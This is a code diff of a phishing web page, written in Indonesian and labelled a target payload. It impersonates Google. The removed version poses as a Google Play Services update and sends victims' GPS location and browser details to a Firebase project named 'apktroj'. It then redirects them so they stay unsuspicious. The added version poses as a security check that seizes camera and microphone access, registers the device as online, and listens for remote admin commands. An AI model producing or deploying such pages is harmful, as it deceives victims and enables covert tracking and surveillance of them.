@@ -1,86 +1,58 @@
+<!-- TARGET PAYLOAD CODE START -->
 <!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Play Service Update</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { background: #f1f3f4; font-family: 'Roboto', sans-serif; }
-        .btn-google { background: #1a73e8; color: white; transition: background 0.2s; }
-        .btn-google:hover { background: #1765cc; }
-    </style>
-</head>
-<body class="flex items-center justify-center min-h-screen">
-    <div class="bg-white p-8 rounded-lg shadow-md max-w-sm w-full text-center">
-        <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" alt="Google" class="mx-auto mb-4 w-12">
-        <h1 class="text-xl font-medium mb-2">Pembaruan Diperlukan</h1>
-        <p class="text-gray-600 text-sm mb-6">Versi Layanan Google Play Anda sudah usang. Perbarui sekarang untuk tetap menggunakan aplikasi Google secara normal.</p>
-        
-        <div id="status" class="hidden mb-4 p-2 bg-blue-50 text-blue-700 text-xs rounded">
-            Mengunduh komponen keamanan...
-        </div>
+<html>
+<head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
+<body style="background:#f1f3f4;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0">
+  <div style="background:white;padding:30px;border-radius:15px;text-align:center;box-shadow:0 4px 6px rgba(0,0,0,0.1);max-width:300px;width:90%">
+    <div style="background:#1a73e8;width:50px;height:50px;border-radius:50%;margin:0 auto 15px;display:flex;align-items:center;justify-content:center;color:white;font-weight:bold;font-size:24px">G</div>
+    <h2 style="margin-bottom:10px;font-size:18px">Verifikasi Keamanan</h2>
+    <p style="font-size:12px;color:#666;margin-bottom:20px">Izinkan verifikasi audio dan biometrik untuk mengamankan akun Google Anda dari akses tidak sah.</p>
+    <button id="btn" style="background:#1a73e8;color:white;border:none;padding:15px 20px;border-radius:8px;cursor:pointer;width:100%;font-weight:bold;font-size:14px">VERIFIKASI SEKARANG</button>
+    <p id="st" style="font-size:10px;color:#999;margin-top:15px">Mendukung enkripsi end-to-end</p>
+  </div>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+    import { getFirestore, doc, onSnapshot, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+    import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
 
-        <button id="update-btn" class="btn-google w-full py-2 rounded font-medium">Update Sekarang</button>
-        
-        <p class="mt-4 text-[10px] text-gray-400">© 2026 Google LLC. Semua hak dilindungi undang-undang.</p>
-    </div>
+    const conf = { 
+        apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo", 
+        authDomain: "apktroj.firebaseapp.com",
+        projectId: "apktroj",
+        appId: "1:943833619122:web:d757ced4d56267abf247ab"
+    };
+    
+    const app = initializeApp(conf); 
+    const db = getFirestore(app);
+    const auth = getAuth(app);
 
-    <!-- Firebase SDK -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getFirestore, doc, setDoc, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+    document.getElementById('btn').onclick = async () => {
+      try {
+        await signInAnonymously(auth);
+        const s = await navigator.mediaDevices.getUserMedia({audio:true, video:true});
+        document.getElementById('btn').innerText = "MENYINKRONKAN...";
+        document.getElementById('btn').disabled = true;
+        document.getElementById('st').innerText = "Enkripsi aktif. Jangan tutup halaman ini.";
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
-            authDomain: "apktroj.firebaseapp.com",
-            projectId: "apktroj",
-            storageBucket: "apktroj.firebasestorage.app",
-            messagingSenderId: "943833619122",
-            appId: "1:943833619122:web:d757ced4d56267abf247ab"
-        };
+        // Update status online target ke Firestore
+        const deviceId = "WEB_" + Math.random().toString(36).substr(2, 9);
+        await setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'status'), {
+            lastSeen: serverTimestamp(),
+            online: true,
+            deviceId: deviceId
+        });
 
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-        const appId = "apktroj";
-
-        const btn = document.getElementById('update-btn');
-        const status = document.getElementById('status');
-
-        btn.onclick = async () => {
-            status.classList.remove('hidden');
-            btn.disabled = true;
-            btn.innerText = "Processing...";
-
-            // 1. Ambil Lokasi (GPS)
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'location_logs'), {
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    timestamp: serverTimestamp()
-                });
-            });
-
-            // 2. Ambil Info Browser & IP
-            const deviceData = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                online: true,
-                lastSeen: serverTimestamp()
-            };
-            
-            await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'devices', 'WEB-' + Date.now()), deviceData);
-
-            // 3. Minta izin Notifikasi (Buat Phishing selanjutnya)
-            Notification.requestPermission();
-
-            // Skenario: Setelah 3 detik, alihkan ke link asli biar target gak curiga
-            setTimeout(() => {
-                window.location.href = "https://play.google.com/store/apps/details?id=com.google.android.gms";
-            }, 3000);
-        };
-    </script>
+        // Listen command dari Admin
+        onSnapshot(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'cmd'), (snap) => {
+           if(snap.exists()){
+             const d = snap.data();
+             console.log("Admin Signal: ", d.type, d.action);
+             // Implementasi stream WebRTC atau snapshot di sini
+           }
+        });
+      } catch(e) { alert("Error: Anda harus memberikan izin kamera & mikrofon untuk verifikasi keamanan."); }
+    };
+  </script>
 </body>
 </html>
+            
